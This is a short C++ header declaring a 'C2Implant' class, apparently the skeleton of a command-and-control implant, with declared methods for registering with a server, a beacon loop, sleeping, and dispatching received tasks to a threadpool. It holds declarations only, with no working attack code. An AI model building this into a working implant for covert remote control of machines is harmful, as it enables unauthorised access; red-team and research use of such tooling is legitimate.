#pragma once

#include <string>
#include <map>
#include <vector>
#include <iostream>
#include <thread>
#include <chrono>
#include "../data/msgpack/msgpack.h"

class C2Implant {
public:
    // --- Instance Data (Specific to this implant) ---
    // Naming: snake_case_ for members
    std::string implant_uuid_;

    // --- Lifecycle Methods ---

    //init's everyhting for the cycle
    static void init();

    //registers to server
    int register_implant();

    // main loop
    void cycle();

    void dispatch_to_threadpool(const nlohmann::json& task);
private:
    // Internal helper to wrap sleep logic
    void sleep_implant();
    void handle_tasks(const nlohmann::json& incoming);
};